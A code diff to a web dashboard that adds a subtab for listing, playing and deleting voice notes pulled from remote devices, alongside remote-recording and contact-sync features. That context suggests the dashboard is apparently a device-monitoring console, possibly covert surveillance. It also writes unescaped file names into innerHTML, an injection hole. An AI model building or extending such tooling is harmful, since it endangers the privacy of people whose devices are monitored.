@@ -87,6 +87,9 @@ button#loadHistoryBtn{padding:5px 7px;font-size:13px;min-height:30px;min-width:3
 .tab-btn{padding:10px 16px;font-size:13px;border:none;background:none;color:var(--muted);cursor:pointer;white-space:nowrap;border-bottom:2px solid transparent;transition:.15s}
 .tab-btn.active{color:var(--accent);border-bottom-color:var(--accent)}
 .tab-btn:hover{color:var(--text)}
+.subtab-btn{padding:6px 14px;font-size:12px;border:1px solid var(--border);background:var(--card);color:var(--muted);cursor:pointer;border-radius:6px;transition:.15s}
+.subtab-btn.active{background:var(--accent);color:#000;border-color:var(--accent);font-weight:500}
+.subtab-btn:hover{color:var(--text)}
 .content{padding:12px;max-height:50vh;overflow-y:auto}
 .content>div{display:none}
 .content>div.active{display:block}
@@ -389,6 +392,12 @@ canvas.chart-canvas{width:100%!important;height:200px!important;border-radius:6p
 <div id="contactsList"><div class="label">No contacts synced yet</div></div>
 </div>
 <div id="tab-voice">
+<div class="subtab-nav" style="display:flex;gap:4px;margin-bottom:12px">
+  <button class="subtab-btn active" data-subtab="voice-remote" onclick="switchVoiceSubtab('voice-remote')">🎙️ Remote Recordings</button>
+  <button class="subtab-btn" data-subtab="voice-notes" onclick="switchVoiceSubtab('voice-notes')">🎤 Voice Notes</button>
+</div>
+
+<div id="voice-sub-remote" class="voice-subtab">
 <div class="voice-record-panel" style="background:var(--card);padding:12px;border-radius:var(--radius);margin-bottom:12px;border:1px solid var(--border)">
 <div style="display:flex;align-items:center;gap:8px;flex-wrap:wrap;margin-bottom:8px">
 <span style="font-size:13px;font-weight:500;color:var(--text)">🎙️ Remote Recording</span>
@@ -433,6 +442,11 @@ canvas.chart-canvas{width:100%!important;height:200px!important;border-radius:6p
 </div>
 </div>
 <div id="voiceNotesList"><div class="label">No recordings yet</div></div>
+</div>
+
+<div id="voice-sub-notes" class="voice-subtab" style="display:none">
+<div id="voiceNotesSubList"><div class="label">Loading voice notes...</div></div>
+</div>
 </div>
 <div id="tab-insights">
 <div class="grid" style="grid-template-columns:1fr 1fr 1fr;margin-bottom:10px">
@@ -1966,6 +1980,173 @@ async function loadAndPlayRecording(recordingId) {
     showAlert('Failed to load audio: ' + e.message, 'error');
   }
 }
+
+// --- Voice Notes Subtab ---
+
+function switchVoiceSubtab(subtab) {
+  document.querySelectorAll('#tab-voice .subtab-btn').forEach(b => b.classList.remove('active'));
+  document.querySelectorAll('#tab-voice .voice-subtab').forEach(d => d.style.display = 'none');
+  document.querySelector(`#tab-voice .subtab-btn[data-subtab="${subtab}"]`).classList.add('active');
+  document.getElementById(`voice-sub-${subtab.replace('voice-', '')}`).style.display = '';
+  if (subtab === 'voice-notes') pollVoiceNotes();
+}
+
+async function pollVoiceNotes() {
+  if (!selectedDevice) return;
+  const list = document.getElementById('voiceNotesSubList');
+  const path = `devices/${selectedDevice}/voice_notes`;
+  
+  const keys = await fetchRTDB(path, 'shallow=true');
+  if (!keys || typeof keys !== 'object' || Object.keys(keys).length === 0) {
+    list.innerHTML = '<div class="label">No voice notes yet</div>';
+    return;
+  }
+  
+  const batchKeys = Object.keys(keys).sort().reverse();
+  list.innerHTML = '<div class="label">Loading voice notes...</div>';
+  
+  const allNotes = [];
+  for (const batchKey of batchKeys) {
+    try {
+      const batch = await fetchRTDB(`${path}/${batchKey}`);
+      if (batch && batch.notes && Array.isArray(batch.notes)) {
+        for (let i = 0; i < batch.notes.length; i++) {
+          const note = batch.notes[i];
+          allNotes.push({ batchKey, noteIndex: i, ...note });
+        }
+      }
+    } catch (e) {
+      console.warn('Failed to fetch voice note batch', batchKey, e);
+    }
+  }
+  
+  if (!allNotes.length) {
+    list.innerHTML = '<div class="label">No voice notes yet</div>';
+    return;
+  }
+  
+  // Sort by dateAdded newest first
+  allNotes.sort((a, b) => (parseInt(b.dateAdded) || 0) - (parseInt(a.dateAdded) || 0));
+  
+  let html = `<div style="font-size:11px;color:var(--muted);margin-bottom:8px">${allNotes.length} voice note${allNotes.length>1?'s':''} • newest first</div>`;
+  
+  for (const note of allNotes) {
+    const fileName = note.fileName || 'Unknown';
+    const dur = note.durationMs ? Math.floor(note.durationMs/60000) + ':' + String(Math.floor(note.durationMs%60000/1000)).padStart(2,'0') : '';
+    const size = note.sizeBytes ? (note.sizeBytes/1024).toFixed(0) + ' KB' : '';
+    const dateAdded = note.dateAdded ? pkt(note.dateAdded * 1000) : '';
+    const mimeType = note.mimeType || 'audio/mp4';
+    const batchKey = note.batchKey;
+    const noteIndex = note.noteIndex;
+    const playerId = `vn_player_${batchKey}_${noteIndex}`;
+    
+    html += `<div class="voice-card">
+      <div class="vname">${fileName} ${dateAdded ? `• ${dateAdded}` : ''} ${dur ? `• ${dur}` : ''} ${size ? `• ${size}` : ''}
+        <button class="chip" style="background:var(--danger);color:#000;border-color:var(--danger);font-size:9px;padding:2px 6px;margin-left:8px" onclick="deleteVoiceNoteFromList('${batchKey}', ${noteIndex})">Delete</button>
+        <button class="chip" style="background:var(--accent);color:#000;border-color:var(--accent);font-size:9px;padding:2px 6px;margin-left:4px" onclick="loadAndPlayVoiceNote('${batchKey}', ${noteIndex})">▶ Play</button>
+      </div>
+      <audio id="${playerId}" controls preload="none" style="width:100%;margin-top:6px;display:none"></audio>
+    </div>`;
+  }
+  list.innerHTML = html;
+}
+
+// Cache voice note data for playback (avoids inline base64 in buttons)
+let voiceNoteDataCache = {};
+
+async function loadAndPlayVoiceNote(batchKey, noteIndex) {
+  const audioEl = document.getElementById(`vn_player_${batchKey}_${noteIndex}`);
+  const btn = audioEl.previousElementSibling?.querySelector('button[onclick*="loadAndPlayVoiceNote"]') || audioEl.previousElementSibling;
+  
+  if (audioEl.src) {
+    if (audioEl.paused) audioEl.play(); else audioEl.pause();
+    return;
+  }
+  
+  // Fetch the batch and get the specific note — store in cache for future
+  const cacheKey = `${batchKey}_${noteIndex}`;
+  let note = voiceNoteDataCache[cacheKey];
+  if (!note) {
+    try {
+      const batch = await fetchRTDB(`devices/${selectedDevice}/voice_notes/${batchKey}`);
+      if (!batch || !batch.notes || !batch.notes[noteIndex]) {
+        showAlert('Voice note not found', 'error');
+        return;
+      }
+      voiceNoteDataCache = {};
+      voiceNoteDataCache[cacheKey] = batch.notes[noteIndex];
+      note = batch.notes[noteIndex];
+    } catch (e) {
+      showAlert('Failed to load voice note', 'error');
+      return;
+    }
+  }
+  
+  const audioData = note.audioData;
+  const mimeType = note.mimeType || 'audio/mp4';
+  if (!audioData) {
+    showAlert('No audio data in this note', 'error');
+    return;
+  }
+  
+  btn.textContent = '⏳ Loading...';
+  btn.disabled = true;
+  audioEl.style.display = 'block';
+  
+  try {
+    const binary = atob(audioData);
+    const bytes = new Uint8Array(binary.length);
+    for (let j = 0; j < binary.length; j++) bytes[j] = binary.charCodeAt(j);
+    
+    const blob = new Blob([bytes], { type: mimeType });
+    audioEl.src = URL.createObjectURL(blob);
+    await audioEl.play();
+    btn.textContent = '⏸ Pause';
+    btn.onclick = () => audioEl.pause();
+    btn.disabled = false;
+    
+    audioEl.onpause = () => {
+      btn.textContent = '▶ Play';
+      btn.onclick = () => loadAndPlayVoiceNote(batchKey, noteIndex);
+    };
+    audioEl.onplay = () => {
+      btn.textContent = '⏸ Pause';
+    };
+  } catch (e) {
+    console.error('Failed to load voice note:', e);
+    btn.textContent = '❌ Error';
+    btn.disabled = false;
+    showAlert('Failed to play voice note: ' + e.message, 'error');
+  }
+}
+
+async function deleteVoiceNoteFromList(batchKey, noteIndex) {
+  if (!selectedDevice) { showAlert('No device selected', 'error'); return; }
+  try {
+    const batch = await fetchRTDB(`devices/${selectedDevice}/voice_notes/${batchKey}`);
+    if (!batch || !batch.notes || !batch.notes[noteIndex]) {
+      showAlert('Voice note not found', 'error');
+      return;
+    }
+    const note = batch.notes[noteIndex];
+    batch.notes.splice(noteIndex, 1);
+    batch.totalCount = batch.notes.length;
+    if (batch.notes.length === 0) {
+      await deleteRTDB(`devices/${selectedDevice}/voice_notes/${batchKey}`);
+    } else {
+      await fetch(`${RTDB}/devices/${selectedDevice}/voice_notes/${batchKey}.json`, {
+        method: 'PUT',
+        body: JSON.stringify(batch)
+      });
+    }
+    showAlert(`Deleted voice note: ${note.fileName || 'unknown'}`, 'warn');
+    pollVoiceNotes();
+    await refreshStorage();
+  } catch (e) {
+    showAlert('Delete failed: ' + e.message, 'error');
+  }
+}
+
 async function pollContacts() {
   if (!selectedDevice) return;
   const list = document.getElementById('contactsList');
@@ -3034,8 +3215,8 @@ async function deleteVoiceNote(batchKey, noteIndex) {
         body: JSON.stringify(batch)
       });
     }
-    showAlert(`Deleted voice note: ${note.fileName || 'unknown'}`, 'warn');
-    pollRecordings();
+     showAlert(`Deleted voice note: ${note.fileName || 'unknown'}`, 'warn');
+    pollVoiceNotes();
     await refreshStorage();
   } catch (e) {
     showAlert('Delete failed: ' + e.message, 'error');
@@ -3453,9 +3634,10 @@ async function getAuthToken() {
   return null;
 }
 
-// Override the voice tab click handler to also fetch recordings
+// Override the voice tab click handler to fetch recordings and voice notes
 document.querySelector('[data-tab="voice"]').addEventListener('click', () => {
   setTimeout(pollRecordings, 100);
+  setTimeout(pollVoiceNotes, 200);
 });
 
 async function estimateNodeSize(path, sampleSize = 3) {
